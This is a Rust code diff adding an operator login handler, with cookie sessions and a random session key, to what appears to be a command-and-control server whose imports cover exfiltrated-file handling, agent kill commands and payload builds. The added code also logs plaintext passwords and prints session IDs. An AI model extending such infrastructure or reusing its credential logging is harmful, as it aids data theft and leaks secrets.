@@ -1,19 +1,27 @@
-use std::sync::Arc;
+use std::{net::SocketAddr, sync::Arc, time::Duration};
 
 use crate::{
+    AUTH_COOKIE_NAME,
     admin_task_dispatch::{admin_dispatch, build_all_bins},
     agents::handle_kill_command,
     app_state::AppState,
     exfil::handle_exfiltrated_file,
+    logging::{log_admin_login_attempt, log_error_async},
+    middleware::verify_password,
     net::{serialise_tasks_for_agent, serve_file},
 };
 use axum::{
-    Json,
-    extract::{Path, Query, Request, State},
+    Json, debug_handler,
+    extract::{ConnectInfo, Path, Query, Request, State},
     http::{HeaderMap, StatusCode},
     response::{Html, IntoResponse, Response},
 };
-use serde::Deserialize;
+use axum_extra::extract::{
+    CookieJar,
+    cookie::{Cookie, SameSite},
+};
+use rand::{Rng, distr::Alphanumeric, rng};
+use serde::{Deserialize, Serialize};
 use shared::{
     net::{XorEncode, decode_http_response},
     pretty_print::print_failed,
@@ -251,4 +259,95 @@ pub async fn build_all_binaries_handler(
         )
             .into_response(),
     }
+}
+
+#[derive(Serialize, Deserialize)]
+pub struct LoginDetails {
+    username: String,
+    password: String,
+}
+
+pub async fn admin_login(
+    jar: CookieJar,
+    addr: ConnectInfo<SocketAddr>,
+    state: State<Arc<AppState>>,
+    Json(body): Json<LoginDetails>,
+) -> (CookieJar, StatusCode) {
+    let ip = &addr.to_string();
+    let username = body.username;
+    let password = body.password;
+
+    // Lookup the operator from the db, if its empty we will create the user in the inner match here.
+    let operator = match state.db_pool.lookup_operator(&username).await {
+        Ok(o) => o,
+        Err(e) => {
+            match e {
+                sqlx::Error::RowNotFound => {
+                    // The db is empty so create the user. The db insert function checks
+                    // for us if a user already exists, if so, it will panic as we don't want anybody
+                    // and everybody creating accounts! And we aren't yet multiplayer
+                    // create_new_operator(username, password, state.clone()).await;
+                    log_admin_login_attempt(&username, &password, ip, true).await;
+                    // TODO
+                    return (jar, StatusCode::INTERNAL_SERVER_ERROR);
+                }
+                _ => {
+                    log_error_async(&format!(
+                        "There was an error with the db whilst trying to log in with creds: \
+                        {username} {password}. {e}",
+                    ))
+                    .await;
+                    log_admin_login_attempt(&username, &password, ip, false).await;
+                    return (jar, StatusCode::INTERNAL_SERVER_ERROR);
+                }
+            }
+        }
+    };
+
+    // We got a result.. lets check the password
+    if let Some((db_username, db_hash, db_salt)) = operator {
+        // Check the username is the same as the db username, as we are doing single operator ops right now
+        // we dont want to allow for easier password spraying, at least username is one additional step of
+        // complexity.
+
+        if username.ne(&db_username) {
+            log_admin_login_attempt(&username, &password, ip, false).await;
+            return (jar, StatusCode::NOT_FOUND);
+        }
+
+        if verify_password(&password, &db_hash, &db_salt).await {
+            // At this point in here we have successfully authenticated..
+            log_admin_login_attempt(&username, &password, ip, true).await;
+
+            let sid = create_session_key();
+            println!("Random SID: {}", sid);
+            let cookie = Cookie::build((AUTH_COOKIE_NAME, sid))
+                .path("/")
+                .http_only(true)
+                .same_site(SameSite::Lax)
+                .max_age(Duration::from_mins(60).try_into().unwrap())
+                .build();
+
+            let jar = jar.add(cookie);
+            return (jar, StatusCode::NOT_FOUND);
+        } else {
+            // Bad password...
+            log_admin_login_attempt(&username, &password, ip, false).await;
+            return (jar, StatusCode::NOT_FOUND);
+        }
+    }
+
+    //
+    // Anything that falls through to this point is invalid
+    //
+    log_admin_login_attempt(&username, &password, ip, false).await;
+    (jar, StatusCode::NOT_FOUND)
+}
+
+fn create_session_key() -> String {
+    let rng = rand::rng();
+    rng.sample_iter(&Alphanumeric)
+        .take(32)
+        .map(char::from)
+        .collect()
 }
